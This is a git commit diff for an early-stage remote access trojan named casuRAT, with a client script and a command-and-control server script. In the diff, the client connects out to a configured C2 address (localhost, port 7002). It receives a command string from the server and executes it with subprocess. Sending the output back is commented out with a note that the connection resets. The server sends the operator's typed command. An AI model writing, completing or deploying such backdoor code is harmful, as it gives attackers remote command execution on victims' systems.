a93c3b747b44268a9ff613021789ed16f3333004
Anthony Kelly <Anthony.James.k@gmail.com>
2021-02-28 11:49:35 -0500

    Make the client retrive its command

--- casuRAT.py
+++ casuRAT.py
@@ -7,18 +7,21 @@ import base64
 
 # Initialize remote host variables with user input
 #rhost = str(input("C2 IP Address\n" ))
-rhost = '127.0.0.1'
 #rport = int(input("C2 Port\n"))
-rport = 7001
+rhost = '127.0.0.1'
+rport = 7002
 rserver = (rhost, rport)
-
-# Run command
-cmd = input("What is your command\n")
-cmdarg = str(cmd).split(" ")
-execute = subprocess.run(cmdarg, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
-data = execute.stdout
 
 # Connect out
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(rserver)
-s.sendall(bytes(execute.stdout, "utf-8"))
+cmd = s.recv(1024).decode()
+print(cmd)
+
+# Run returned command
+cmdarg = str(cmd).split(" ")
+execute = subprocess.run(cmdarg, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+print(execute.stdout)
+
+# Send the output back - CONNECTION HAS RESET
+# s.sendall(bytes(execute.stdout, "utf-8"))
--- server.py
+++ server.py
@@ -2,13 +2,17 @@
 
 # Standard libraries only.
 import socket
+import time
 
 # Initialize socket bind variables with user input.
 # lhost = str(input("Local bind address\n"))
-lhost = '127.0.0.1'
 # lport = int(input("Local bind port\n"))
-lport = 7001
+lhost = '127.0.0.1'
+lport = 7002
 lserver = (lhost, lport)
+
+# Take a command from a user
+cmd = input("What is your command\n")
 
 # Create a socket that accepts connections, prints who connected, and recieves a message.
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
@@ -18,7 +22,7 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
     with conn:
         print('connected by', addr)
         while True:
-            data = conn.recv(1024).decode()
-            if not data:
+            conn.sendall(bytes(cmd, "utf-8"))
+            break
+            if not cmd:
                 break
-            print(data)
